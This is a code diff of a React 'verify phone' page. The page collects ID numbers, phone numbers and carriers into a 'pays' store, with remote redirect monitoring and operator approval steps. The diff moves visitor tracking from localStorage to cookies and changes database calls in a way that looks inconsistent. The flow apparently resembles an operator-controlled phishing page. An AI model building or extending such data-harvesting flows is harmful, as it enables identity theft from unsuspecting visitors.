@@ -24,9 +24,10 @@ import {
   doc,
   onSnapshot,
   getDoc,
-  Firestore,
 } from "@/lib/supabase-client";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { getCookie, setCookie, eraseCookie } from '@/lib/cookies';
+
 
 export default function VerifyPhonePage() {
   const [idNumber, setIdNumber] = useState("");
@@ -53,13 +54,13 @@ export default function VerifyPhonePage() {
   ];
 
   const visitorId =
-    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";
+    typeof window !== "undefined" ? getCookie("visitor") || "" : "";
 
   useRedirectMonitor({ visitorId, currentPage: "phone" });
 
   useEffect(() => {
     if (visitorId && db) {
-      const visitorRef = doc(db as Firestore, "pays", visitorId);
+      const visitorRef = doc("pays", visitorId);
       setDoc(visitorRef, { redirectPage: null }, { merge: true }).catch((err) =>
         console.error("[phone-info] Failed to clear redirectPage:", err),
       );
@@ -70,7 +71,7 @@ export default function VerifyPhonePage() {
   useEffect(() => {
     if (!visitorId || !db) return;
     const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorId),
+      doc("pays", visitorId),
       (docSnap) => {
         if (!docSnap.exists()) return;
         const data = docSnap.data();
@@ -143,13 +144,13 @@ export default function VerifyPhonePage() {
     if (!idNumber || !phoneNumber || !selectedCarrier) return;
     if (!validateIdNumber(idNumber)) return;
     if (!validatePhoneNumber(phoneNumber)) return;
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID || !db) return;
 
     setApprovalError("");
     try {
       await setDoc(
-        doc(db as Firestore, "pays", visitorID),
+        doc("pays", visitorID),
         {
           phoneIdNumber: idNumber,
           phoneNumber: phoneNumber,
@@ -182,10 +183,10 @@ export default function VerifyPhonePage() {
 
   // Carrier modal rejected → show inline error, reset for retry
   const handleRejected = async () => {
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID || !db) return;
     try {
-      const docRef = doc(db as Firestore, "pays", visitorID);
+      const docRef = doc("pays", visitorID);
       const docSnap = await getDoc(docRef);
       if (docSnap.exists()) {
         const data = docSnap.data();
